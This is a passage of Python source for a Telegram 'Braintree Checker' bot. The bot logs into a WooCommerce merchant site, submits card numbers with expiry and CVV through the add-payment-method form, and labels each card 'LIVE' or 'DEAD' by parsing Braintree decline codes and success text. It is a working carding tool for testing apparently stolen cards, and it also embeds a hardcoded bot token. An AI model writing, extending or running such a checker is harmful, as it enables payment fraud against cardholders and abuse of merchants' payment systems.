                    if message_text and any(phrase in message_text.lower() for phrase in ['added', 'saved', 'success']):
                        error_message = f"SUCCESS: {message_text}"
                        is_approved = True
                        logger.info(f"[{cc[-4:]}] SUCCESS: Found success message: {message_text}")
                        break

            if not error_message:
                error_selectors = [
                    '.woocommerce-error',
                    '.woocommerce-notice--error',
                    '.notice.notice-error',
                    '.alert.alert-danger',
                    '.error-message',
                    '#wc-braintree-credit-card-new-payment-method-form-errors'
                ]

                for selector in error_selectors:
                    error_elem = soup.select_one(selector)
                    if error_elem:
                        message_text = error_elem.get_text(strip=True)
                        if message_text and len(message_text) > 3:
                            error_message = f"DECLINED: {message_text}"
                            is_approved = False
                            logger.info(f"[{cc[-4:]}] DECLINED: Found error message: {message_text}")
                            break

        if not error_message:
            braintree_errors = {
                'processor declined': 'Processor Declined',
                'gateway rejected': 'Gateway Rejected',
                'insufficient funds': 'Insufficient Funds',
                'card verification': 'CVV Verification Failed',
                'expired card': 'Card Expired',
                'invalid card': 'Invalid Card Number',
                'authentication failed': 'Authentication Failed',
                '2000 ': 'Do Not Honor',
                '2001 ': 'Insufficient Funds',
                '2002 ': 'Limit Exceeded',
                '2003 ': 'Cardholder\'s Bank Cannot Be Reached',
                '2004 ': 'Authorization Expired',
                '2010 ': 'Partial Authorization',
                '2015 ': 'Transaction Not Allowed',
                '2016 ': 'Duplicate Transaction',
                '2017 ': 'Cardholder Stopped Billing',
                '2018 ': 'Cardholder Stopped All Billing',
                '2019 ': 'Invalid Transaction',
                '2020 ': 'Violation'
            }

            for error_key, error_desc in braintree_errors.items():
                if error_key in response_text:
                    error_message = f"DECLINED: {error_desc}"
                    is_approved = False
                    logger.info(f"[{cc[-4:]}] DECLINED: Braintree error - {error_desc}")
                    break

        if not error_message:
            success_patterns = [
                'payment method was successfully added',
                'payment method has been saved',
                'successfully added to your account',
                'card has been saved',
                'payment method saved'
            ]

            for pattern in success_patterns:
                if pattern in response_text:
                    error_message = "Payment method successfully added"
                    is_approved = True
                    logger.info(f"[{cc[-4:]}] SUCCESS: Found success pattern: {pattern}")
                    break

        if not error_message:
            if final_req.status_code == 302:
                if 'Location' in final_req.headers:
                    redirect_url = final_req.headers['Location'].lower()
                    if 'payment-methods' in redirect_url and 'add' not in redirect_url:
                        error_message = "Payment method added (302 redirect to payment methods)"
                        is_approved = True
                    else:
                        error_message = f"Redirected to: {redirect_url}"
                        is_approved = False
                else:
                    error_message = "302 redirect with unknown destination"
                    is_approved = False
            elif final_req.status_code == 200:
                if 'add-payment-method' in final_req.url:
                    error_message = "Still on add payment page - likely declined"
                    is_approved = False
                else:
                    error_message = "Unknown response - check manually"
                    is_approved = False
            else:
                error_message = f"HTTP {final_req.status_code} error"
                is_approved = False

        logger.info(f"[{cc[-4:]}] FINAL RESULT: {'APPROVED' if is_approved else 'DECLINED'} - {error_message}")

        summary = "LIVE â" if is_approved else "DEAD â"

        return {
            "is_approved": is_approved,
            "summary": f"{summary} - {error_message[:50]}...",
            "message": error_message or "No response message found"
        }

    except Exception as e:
        logger.error(f"[{cc[-4:]}] Critical error in Braintree check: {e}")
        return {
            "is_approved": False,
            "summary": "ERROR - Script Failed",
            "message": f"Script error: {str(e)[:100]}..."
        }

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("Welcome to Braintree Auto. Use `/set_target` to begin.")

async def set_target_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    context.user_data['next_action'] = 'handle_login_details'
    await update.message.reply_text("Provide site login: `DOMAIN|USERNAME|PASSWORD|PAYMENT_URL (Optional)`\n(e.g., `www.example.com|user@email.com|pass123|https://example.com/payment-methods/add`)")

async def route_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    action = context.user_data.get('next_action')
    text = update.message.text.strip()

    if action == 'handle_login_details':
        parts = text.split('|')
        if len(parts) >= 3:
            domain, login, pwd = map(str.strip, parts[:3])
            payment_url = parts[3].strip() if len(parts) > 3 else None
            context.user_data['site_config'] = {'domain': domain, 'user': login, 'pass': pwd, 'payment_url': payment_url}
            context.user_data['next_action'] = 'awaiting_card_check'
            await update.message.reply_text(f"â **Target Config Saved for `{escape_markdown(domain, 2)}`**\n\nReady for card checks via `/chk` or `/mchk`\.")
        else:
            await update.message.reply_text("Invalid format. Use `DOMAIN|USER|PASS|PAYMENT_URL (Optional)`.")

    elif action == 'awaiting_card_check' and text.count('|') == 3:
        await chk_command(update, context, card_details_str=text)
    else:
        await update.message.reply_text("Ready for card checks.")

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE, card_details_str: str = None):
    if 'site_config' not in context.user_data:
        await update.message.reply_text("â ï¸ Site context not set. Use /set_target first.")
        return

    card_str = card_details_str or update.message.text.replace("/chk", "").strip()
    if card_str.count('|') != 3:
        await update.message.reply_text("â ï¸ Invalid format. Use: `/chk CC|MM|YY|CVV`")
        return

    cc, mm, yy, cvv = map(str.strip, card_str.split('|'))
    status_msg = await update.message.reply_text(f"â³ Checking `{escape_markdown(cc[-4:], 2)}`\.\.\.")

    bin_info_task = get_bin_info(cc)
    check_result_task = asyncio.to_thread(_sync_perform_braintree_check, cloudscraper.create_scraper(), context.user_data['site_config'], {'cc': cc, 'mm': mm, 'yy': yy, 'cvv': cvv})
    bin_info, check_result = await asyncio.gather(bin_info_task, check_result_task)

    icon = "â" if check_result["is_approved"] else "â"
    bin_text = "\n".join([f"   - {k}: {v}" for k, v in bin_info.items()])
    final_text = (
        f"*{icon} {escape_markdown(check_result['summary'], 2)}*\n\n"
        f"**Card:** `{escape_markdown(card_str, 2)}`\n"
        f"**Response:** `{escape_markdown(check_result['message'], 2)}`\n\n"
        f"**BIN Info:**\n`{escape_markdown(bin_text, 2)}`"
    )
    await safe_edit_message(status_msg, final_text)

def main():
    if BOT_TOKEN == "7879139068:AAGtyGpgOM-kjtdpnpOmr3Q1N_pg60GW0AQ":
        logger.critical("BOT_TOKEN is not set!")
        return

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("set_target", set_target_command))
    app.add_handler(CommandHandler("chk", chk_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, route_text_message))

    logger.info("Braintree Checker () is operational.")
    app.run_polling()

if __name__ == "__main__":
    main()
